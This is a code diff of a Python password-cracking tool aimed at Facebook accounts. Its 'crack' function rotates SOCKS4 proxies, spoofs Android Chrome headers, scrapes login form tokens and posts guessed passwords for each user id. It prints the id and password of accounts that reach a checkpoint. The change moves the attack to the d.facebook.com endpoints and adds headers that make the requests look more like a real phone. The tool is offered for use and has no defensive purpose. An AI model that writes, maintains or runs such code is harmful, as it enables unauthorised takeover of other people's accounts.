@@ -877,7 +877,7 @@ def crack(idf,pwv):
         try:
             nip=random.choice(prox)
             proxs= {'http': 'socks4://'+nip}
-            ses.headers.update({"Host":'x.facebook.com',
+            ses.headers.update({"Host":'d.facebook.com',
                 'method': 'POST',
                 'path': '/login/device-based/login/async/',
                 'scheme': 'https',
@@ -885,12 +885,14 @@ def crack(idf,pwv):
                 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                 'cache-control': 'max-age=0',
                 'dpr': '2.75',
-                'referer': 'https://x.facebook.com/bookmarks/',
+                'referer': 'https://d.facebook.com/?wtsid=rdr_0NjFsTaMK0Dcdg9m2&refsrc=deprecated&_rdr',
                 'sec-ch-prefers-color-scheme': 'dark',
                 'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                 'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
                 'sec-ch-ua-mobile': '?1',
+                'sec-ch-ua-model': '"2201116PI"',
                 'sec-ch-ua-platform': '"Android"',
+                'sec-ch-ua-platform-version': '"13.0.0"',
                 'sec-fetch-dest': 'document',
                 'sec-fetch-mode': 'navigate',
                 'sec-fetch-site': 'same-origin',
@@ -898,11 +900,11 @@ def crack(idf,pwv):
                 'upgrade-insecure-requests': '1',
                 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                 'viewport-width': '980',})
-            p = ses.get('https://x.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
-            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.prod.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
+            p = ses.get('https://d.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
+            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://d.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
             koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
             koki+=' m_pixel_ratio=2.625; wd=412x756'
-            heade = {'Host': 'x.facebook.com',
+            heade = {'Host': 'd.facebook.com',
                 'method': 'POST',
                 'path': '/login/device-based/login/async/',
                 'scheme': 'https',
@@ -910,12 +912,14 @@ def crack(idf,pwv):
                 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                 'cache-control': 'max-age=0',
                 'dpr': '2.75',
-                'referer': 'https://x.facebook.com/bookmarks/',
+                'referer': 'https://d.facebook.com/?wtsid=rdr_0NjFsTaMK0Dcdg9m2&refsrc=deprecated&_rdr',
                 'sec-ch-prefers-color-scheme': 'dark',
                 'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                 'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
                 'sec-ch-ua-mobile': '?1',
+                'sec-ch-ua-model': '"2201116PI"',
                 'sec-ch-ua-platform': '"Android"',
+                'sec-ch-ua-platform-version': '"13.0.0"',
                 'sec-fetch-dest': 'document',
                 'sec-fetch-mode': 'navigate',
                 'sec-fetch-site': 'same-origin',
@@ -923,7 +927,7 @@ def crack(idf,pwv):
                 'upgrade-insecure-requests': '1',
                 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                 'viewport-width': '980',}
-            po = ses.post('https://x.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
+            po = ses.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
                 print(f'\r\033[0;96m[CP] {idf} • {pw}')
                 os.system('espeak -a 300 " oh shit Cp ID"')
